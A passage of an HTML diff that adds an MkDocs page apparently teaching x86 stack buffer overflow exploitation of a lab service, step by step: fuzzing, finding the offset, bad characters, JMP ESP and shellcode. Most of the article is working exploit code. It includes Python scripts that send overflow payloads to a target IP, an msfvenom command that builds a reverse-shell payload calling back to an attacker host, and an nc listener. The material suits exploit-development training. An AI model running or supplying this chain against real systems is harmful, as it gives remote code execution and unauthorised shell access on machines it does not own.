+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-1-spiking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1. Spiking
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 1. Spiking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-you-do" class="md-nav__link">
+    <span class="md-ellipsis">
+      What you do
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-2-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2. Fuzzing
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 2. Fuzzing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how" class="md-nav__link">
+    <span class="md-ellipsis">
+      How
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-python-script-1py" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example Python Script (1.py)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#outcome" class="md-nav__link">
+    <span class="md-ellipsis">
+      Outcome
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-3-finding-the-offset" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3. Finding the Offset
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 3. Finding the Offset">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tool
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#process" class="md-nav__link">
+    <span class="md-ellipsis">
+      Process
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-4-overwriting-the-eip" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4. Overwriting the EIP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 4. Overwriting the EIP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      How
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-python-script-3py" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example Python Script (3.py)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#outcome_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Outcome
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-5-finding-bad-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5. Finding Bad Characters
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 5. Finding Bad Characters">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#process_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Process
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-python-script-4py" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example Python Script (4.py)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analysis-in-debugger" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis in Debugger
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-6-finding-a-suitable-module-jmp-esp-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 6. Finding a Suitable Module &amp; JMP ESP Address
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 6. Finding a Suitable Module & JMP ESP Address">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-monapy-in-immunity" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Mona.py in Immunity
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-nasm_shell-optional" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using nasm_shell (Optional)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-7-overwriting-the-eip-with-a-jmp-esp-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 7. Overwriting the EIP with a JMP ESP Address
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 7. Overwriting the EIP with a JMP ESP Address">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      Payload
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#little-endian-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      Little Endian Note
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Notes
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-8-generating-shellcode-and-getting-a-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 8. Generating Shellcode and Getting a Reverse Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 8. Generating Shellcode and Getting a Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generate-shellcode-with-msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Generate Shellcode with msfvenom
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Generate Shellcode with msfvenom">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      Breakdown:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#incorporate-shellcode-into-the-final-exploit-6py" class="md-nav__link">
+    <span class="md-ellipsis">
+      Incorporate Shellcode into the Final Exploit (6.py)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gaining the Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Gaining the Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#listener" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listener
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execute-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execute Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-clarifications" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Clarifications
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Final Clarifications">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#debugging-remotely" class="md-nav__link">
+    <span class="md-ellipsis">
+      Debugging Remotely
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bad-characters-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bad Characters Identification
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finding-jmp-esp-xffxe4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding JMP ESP (\xff\xe4)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#little-endian-and-x64-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Little Endian and x64 Considerations
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="buffer-overflow-x86">Buffer Overflow x86</h1>
+<h2 id="overview-debugging-remote-exploitation">Overview: Debugging &amp; Remote Exploitation</h2>
+<h4 id="q1-do-i-need-immunity-debugger-to-be-on-or-attached-to-the-target-machine-can-i-get-the-same-information-remotely">Q1 Do I need Immunity Debugger to be “on” or attached to the target machine? Can I get the same information remotely?</h4>
+<p>Immunity Debugger is a Windows debugger that you typically run on a machine where you control (or have a copy of) the vulnerable application.</p>
+<h4 id="local-vs-remote">Local vs. Remote:</h4>
+<ul>
+<li><strong>Local debugging:</strong> You run the vulnerable program inside Immunity on your own machine (or in a lab VM). This lets you see registers, memory dumps, and other details (like bad characters) easily.</li>
+<li><strong>Remote exploitation:</strong> When exploiting a service over a network, you generally send your payload remotely (e.g., using Python scripts) and trigger the crash. However, you cannot “attach” Immunity Debugger to a remote target unless that target has been set up for remote debugging (which is rare in production).</li>
+</ul>
+<h4 id="answer">Answer:</h4>
+<p>In practice, exploit developers replicate the target environment in a controlled lab. You develop and refine your exploit locally (with Immunity, for example) and then use that exploit remotely. Without local control or remote debugging capabilities, you won’t be able to view a memory dump (and thus, the bad characters) as provided by Immunity.</p>
+<h4 id="q2-is-it-possible-to-do-this-sort-of-exploit-remotely">Q2: Is it possible to do this sort of exploit remotely?</h4>
+<h4 id="answer_1">Answer:</h4>
+<p>Yes. Many buffer overflow exploits target network services that accept data from remote attackers. While you can trigger the overflow remotely, the detailed debugging (to see registers, memory layout, etc.) is usually done in a lab setting that mimics the target.</p>
+<hr />
+<h2 id="a-comprehensive-guide-to-developing-a-buffer-overflow-exploit">A Comprehensive Guide to Developing a Buffer Overflow Exploit</h2>
+<h3 id="anatomy-of-process-memory-typical-in-windows">Anatomy of Process Memory (Typical in Windows)</h3>
+<ul>
+<li><strong>Kernel</strong> – High memory addresses (privileged area)</li>
+<li><strong>Stack</strong> – Contains:</li>
+<li><strong>ESP:</strong> Current top-of-stack pointer</li>
+<li><strong>Buffer space:</strong> Local variables, including our vulnerable buffer</li>
+<li><strong>EBP:</strong> Base pointer (frame pointer)</li>
+<li><strong>EIP:</strong> Instruction pointer (4 bytes on x86)</li>
+<li><strong>Heap</strong></li>
+<li><strong>Data Section</strong></li>
+<li><strong>Text Section (Code):</strong> Starts at lower addresses</li>
+</ul>
+<blockquote>
+<p><strong>Note:</strong> Overflowing a buffer on the stack eventually overwrites the saved EIP. This is where you gain control of the execution flow.</p>
+</blockquote>
+<hr />
+<h2 id="step-1-spiking">Step 1. Spiking</h2>
+<h3 id="objective">Objective</h3>
+<p>Determine that a buffer overflow exists and roughly how many bytes are needed to crash the application.</p>
+<h3 id="what-you-do">What you do</h3>
+<p>Send a very long string (often of repeated characters) to the vulnerable input until the application crashes.</p>
+<h3 id="example">Example</h3>
+<p>A tool (such as a custom <code>generic_send_tcp</code>) or a Python script can be used to send this “spike.”</p>
+<blockquote>
+<p><strong>Note:</strong> The term “spiking” refers to the initial step of flooding the input to find when the application crashes.</p>
+</blockquote>
+<hr />
+<h2 id="step-2-fuzzing">Step 2. Fuzzing</h2>
+<h3 id="objective_1">Objective</h3>
+<p>Refine the amount of data needed to crash the application.</p>
+<h3 id="how">How</h3>
+<p>Use a script that repeatedly sends an increasing number of characters until the service stops responding.</p>
+<h3 id="example-python-script-1py">Example Python Script (<code>1.py</code>)</h3>
+<pre><code class="language-python">#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = &quot;A&quot; * 100  # start with 100 bytes
+
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.90', 9999))
+        # Note: 'TRUN /.:/' is specific to the vulnerable command; adjust as needed.
+        s.send(('TRUN /.:/' + buffer))
+        s.close()
+        sleep(1)
+        buffer += &quot;A&quot; * 100  # increase payload size gradually
+    except:
+        print(&quot;Fuzzing crashed at %s bytes&quot; % len(buffer))
+        sys.exit()
+</code></pre>
+<h3 id="outcome">Outcome</h3>
+<p>You might find that the application crashes, for example, when receiving 3000 bytes.</p>
+<hr />
+<h2 id="step-3-finding-the-offset">Step 3. Finding the Offset</h2>
+<h3 id="objective_2">Objective</h3>
+<p>Identify exactly where in your input the EIP gets overwritten.</p>
+<h3 id="tool">Tool</h3>
+<p>Metasploit provides <code>pattern_create.rb</code> and <code>pattern_offset</code> (or similar tools such as pwntools’ cyclic pattern).</p>
+<h3 id="process">Process</h3>
+<ol>
+<li>Generate a unique cyclic pattern of 3000 bytes:</li>
+</ol>
+<p><code>bash
+   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000</code></p>
+<ol>
+<li>Replace your “fuzzed” payload with this pattern and cause a crash.</li>
+<li>In your debugger (e.g., Immunity), note the value in EIP (say, <code>38f4337</code>).</li>
+<li>Use the offset tool:</li>
+</ol>
+<p><code>bash
+   /usr/share/metasploit-framework/tools/exploit/pattern_offset -l 3000 -q 38f4337</code></p>
+<p><strong>Result:</strong> It might tell you that the exact offset is at, for example, <code>2003</code> bytes.</p>
+<blockquote>
+<p><strong>Note:</strong> If you’re not the owner of the server, you can’t attach a debugger like Immunity remotely. Instead, you replicate the environment locally to determine the offset. In real-world penetration tests, you’d develop your exploit on a lab copy of the vulnerable software.</p>
+</blockquote>
+<hr />
+<h2 id="step-4-overwriting-the-eip">Step 4. Overwriting the EIP</h2>
+<h3 id="objective_3">Objective</h3>
+<p>Confirm you can control the instruction pointer.</p>
+<h3 id="how_1">How</h3>
+<p>Create a new payload with:
+- 2003 bytes of filler (e.g., "A")
+- 4 bytes to overwrite EIP (e.g., "B" * 4, which in memory is <code>0x42424242</code>)</p>
+<h3 id="example-python-script-3py">Example Python Script (<code>3.py</code>)</h3>
+<pre><code class="language-python">#!/usr/bin/python
+import sys, socket
+
+payload = &quot;A&quot; * 2003 + &quot;B&quot; * 4
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.1.90', 9999))
+    s.send(('TRUN /.:/' + payload))
+    s.close()
+except:
+    print(&quot;Error connecting to server&quot;)
+    sys.exit()
+</code></pre>
+<h3 id="outcome_1">Outcome</h3>
+<p>In your debugger, you should see the EIP overwritten with <code>0x42424242</code>.</p>
+<hr />
+<h2 id="step-5-finding-bad-characters">Step 5. Finding Bad Characters</h2>
+<h3 id="objective_4">Objective</h3>
+<p>Identify any bytes that the vulnerable application “mangles” or filters out. These are “bad characters” you must avoid in your shellcode.</p>
+<h3 id="process_1">Process</h3>
+<ol>
+<li>Create a payload that appends every possible byte (except typically <code>\x00</code>) after your EIP overwrite.</li>
+<li>Send the payload and use the debugger to dump the memory.</li>
+<li>Compare the expected byte sequence with what appears in memory. Any discrepancies indicate bad characters.</li>
+</ol>
+<h3 id="example-python-script-4py">Example Python Script (<code>4.py</code>)</h3>
+<pre><code class="language-python">#!/usr/bin/python
+import sys, socket
+
+badchars = (
+    &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
+    &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
+    &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
+    &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
+    &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
+    &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
+    &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
+    &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
+    &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
+    &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
+    &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
+    &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
+    &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
+    &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
+    &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
+    &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
+)
+
+payload = &quot;A&quot; * 2003 + &quot;B&quot; * 4 + badchars
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.1.90', 9999))
+    s.send(('TRUN /.:/' + payload))
+    s.close()
+except:
+    print(&quot;Error connecting to server&quot;)
+    sys.exit()
+</code></pre>
+<h3 id="analysis-in-debugger">Analysis in Debugger</h3>
+<p>In Immunity Debugger, view the memory dump (often via a “hexdump” window). Compare the sequence you sent with what appears. For example, if you see that bytes for <code>\x04</code> and <code>\x05</code> are replaced (say by <code>B0</code>), then these bytes are “bad.”</p>
+<blockquote>
+<p><strong>Note:</strong> The missing or altered bytes in the hexdump indicate the bad characters that you must avoid when generating shellcode.</p>
+</blockquote>
+<hr />
+<h2 id="step-6-finding-a-suitable-module-jmp-esp-address">Step 6. Finding a Suitable Module &amp; JMP ESP Address</h2>
+<h3 id="objective_5">Objective</h3>
+<p>Choose a module (DLL/EXE) that is not protected by ASLR or SafeSEH, and find an instruction that jumps to your shellcode (typically a <code>JMP ESP</code>).</p>
+<h3 id="using-monapy-in-immunity">Using Mona.py in Immunity</h3>
+<ol>
+<li>Place the <code>mona.py</code> script in the <code>ImmunityDebugger\PyCommands</code> folder.</li>
+<li>Run the command to list modules:</li>
+</ol>
+<p><code>!mona modules</code></p>
+<p>Look for one with fixed base addresses (e.g., <code>essfunc.dll</code>).</p>
+<ol>
+<li>Search for a <code>JMP ESP</code>:</li>
+<li>In x86 assembly, the opcode for <code>JMP ESP</code> is <code>\xff\xe4</code>.</li>
+<li>You can use Mona to search:</li>
+</ol>
+<p><code>!mona find -s "\xff\xe4" -m essfunc.dll</code></p>
+<p>This command tells Mona to search for the byte sequence <code>\xff\xe4</code> in the specified module.</p>
+<blockquote>
+<p><strong>Note:</strong> The byte sequence <code>\xff\xe4</code> is the machine code for <code>JMP ESP</code> on x86. You use it in your search because you need to redirect execution to your shellcode. This opcode is standard regardless of the source. However, on x64, exploitation techniques often differ and require other considerations such as ROP chains.</p>
+</blockquote>
+<h3 id="using-nasm_shell-optional">Using nasm_shell (Optional)</h3>
+<ul>
+<li>Some tutorials show using <code>nasm_shell</code> to manually verify that an opcode (like <code>FFE4</code>) corresponds to <code>JMP ESP</code>.</li>
+<li>This step confirms that the address you later use (e.g., <code>625011af</code>) really points to a <code>JMP ESP</code>.</li>
+</ul>
+<hr />
+<h2 id="step-7-overwriting-the-eip-with-a-jmp-esp-address">Step 7. Overwriting the EIP with a JMP ESP Address</h2>
+<h3 id="objective_6">Objective</h3>
+<p>Use the offset and a valid return address from a module that contains a <code>JMP ESP</code> to redirect execution to your shellcode.</p>
+<h3 id="payload">Payload</h3>
+<p>For example, if your offset is <code>2003</code> bytes and you have found a <code>JMP ESP</code> address (e.g., <code>625011af</code> in little-endian format becomes <code>\xaf\x11\x50\x62</code>), your payload looks like:</p>
+<pre><code class="language-python">#!/usr/bin/python
+import sys, socket
+
+payload = &quot;A&quot; * 2003 + &quot;\xaf\x11\x50\x62&quot;  # Overwrites EIP
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.1.90', 9999))
+    s.send(('TRUN /.:/' + payload))
+    s.close()
+except:
+    print(&quot;Error connecting to server&quot;)
+    sys.exit()
+</code></pre>
+<h3 id="little-endian-note">Little Endian Note</h3>
+<ul>
+<li><strong>x86 (32-bit):</strong> The processor stores the lowest-order byte at the lowest memory address. For example, the address <code>625011af</code> is sent as <code>\xaf\x11\x50\x62</code>.</li>
+<li><strong>x64 (64-bit):</strong> The same little-endian ordering applies, but exploitation on x64 is more complex (e.g., you often use Return-Oriented Programming or other techniques rather than a simple <code>JMP ESP</code>).</li>
+</ul>
+<h3 id="notes">Notes</h3>
+<p>The 4-byte address must be reversed when written into your payload (e.g., <code>625011af</code> becomes <code>\xaf\x11\x50\x62</code>). This concept holds true for both x86 and x64, although exploitation techniques for 64-bit targets often require more advanced methods.</p>
+<hr />
+<h2 id="step-8-generating-shellcode-and-getting-a-reverse-shell">Step 8. Generating Shellcode and Getting a Reverse Shell</h2>
+<h3 id="objective_7">Objective</h3>
+<p>Create shellcode that avoids bad characters and, when executed, connects back to your machine to give you control.</p>
+<h3 id="generate-shellcode-with-msfvenom">Generate Shellcode with msfvenom</h3>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.131.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b &quot;\x00&quot;
+</code></pre>
+<h4 id="breakdown">Breakdown:</h4>
+<ul>
+<li><code>-p windows/shell_reverse_tcp</code>: Specifies the payload (a reverse shell).</li>
+<li><code>LHOST &amp; LPORT</code>: Your IP address and the port that will receive the connection.</li>
+<li><code>EXITFUNC=thread</code>: How the payload should exit (improves stability).</li>
+<li><code>-f c</code>: Output format as a C-style string.</li>
+<li><code>-a x86</code>: Architecture (x86 in this example).</li>
+<li><code>-b "\x00"</code>: Bad characters to avoid (at minimum, the null byte; add others as identified).</li>
+</ul>
+<h3 id="incorporate-shellcode-into-the-final-exploit-6py">Incorporate Shellcode into the Final Exploit (<code>6.py</code>)</h3>
+<pre><code class="language-python">#!/usr/bin/python
+import sys, socket
+
+# Padding: 2003 bytes to reach EIP
+# Overwrite EIP with the JMP ESP address: \xaf\x11\x50\x62
+# NOP sled: 32 bytes (no-operation, to help slide into the shellcode)
+# Shellcode: (generated by msfvenom, paste your payload here)
+shellcode = &quot;A&quot; * 2003 + &quot;\xaf\x11\x50\x62&quot; + &quot;\x90&quot; * 32 + \
+(&quot;&lt;your msfvenom-generated shellcode here&gt;&quot;)
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.1.90', 9999))
+    s.send(('TRUN /.:/' + shellcode))
+    s.close()
+except:
+    print(&quot;Error connecting to server&quot;)
+    sys.exit()
+</code></pre>
+<h3 id="gaining-the-shell">Gaining the Shell</h3>
+<h4 id="listener">Listener</h4>
+<p>On your attacking machine, open a terminal and start a listener:</p>
+<pre><code class="language-bash">nc -nvlp 4444
+</code></pre>
+<h4 id="execute-exploit">Execute Exploit</h4>
+<p>Run your Python script (e.g., <code>./6.py</code>). If successful, the shellcode will execute on the target, and you’ll receive a reverse shell.</p>
+<hr />
+<h2 id="summary">Summary</h2>
+<ul>
+<li><strong>Spiking &amp; Fuzzing:</strong> Find the approximate size needed to crash the application.</li>
+<li><strong>Finding the Offset:</strong> Use unique cyclic patterns to determine where the EIP is overwritten.</li>
+<li><strong>Overwriting the EIP:</strong> Confirm control over the EIP with a controlled 4-byte value.</li>
+<li><strong>Bad Characters:</strong> Identify which bytes cannot be used in your shellcode by comparing your sent pattern with a memory dump in a debugger.</li>
+<li><strong>Module Selection &amp; JMP ESP:</strong> Use tools like <code>Mona.py</code> to find a module (e.g., <code>essfunc.dll</code>) with a predictable address and search for the <code>JMP ESP</code> opcode (<code>\xff\xe4</code>).</li>
+<li><strong>Shellcode Generation:</strong> Use <code>msfvenom</code> to create shellcode that avoids bad characters.</li>
+<li><strong>Exploitation:</strong> Combine your findings into a final payload that overwrites the EIP, jumps to a NOP sled and your shellcode, and (via a remote connection) gives you control over the target.</li>
+</ul>
+<hr />
+<h2 id="final-clarifications">Final Clarifications</h2>
+<h3 id="debugging-remotely">Debugging Remotely</h3>
+<p>Immunity Debugger needs to run on the same machine as the vulnerable process (or via a remote debugging session set up by the target). In practice, you replicate the target locally for debugging. Remote exploitation is done by sending your payload over the network—without a debugger attached, you must rely on prior lab testing to know your payload works.</p>
+<h3 id="bad-characters-identification">Bad Characters Identification</h3>
+<p>Your method is correct: by comparing the expected sequence to the hexdump in your debugger, you identify missing or altered bytes (e.g., if you see that bytes intended as <code>\x04</code> and <code>\x05</code> are changed, then they are bad).</p>
+<h3 id="finding-jmp-esp-xffxe4">Finding JMP ESP (<code>\xff\xe4</code>)</h3>
+<p>The command:</p>
+<pre><code class="language-bash">!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll
+</code></pre>
+<p>tells Mona to search within a given module for the opcode corresponding to <code>JMP ESP</code>. This opcode is standard on x86 and is used to redirect execution to your shellcode. The module is chosen because it is not protected by ASLR or SafeSEH.</p>
+<h3 id="little-endian-and-x64-considerations">Little Endian and x64 Considerations</h3>
+<p>On x86 systems, addresses are stored in little-endian order (so <code>625011af</code> becomes <code>\xaf\x11\x50\x62</code>). This ordering is the same on x64 systems, but note that exploitation on x64 often requires additional techniques (such as ROP) due to extra security mechanisms.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+    
+  </body>
+</html>
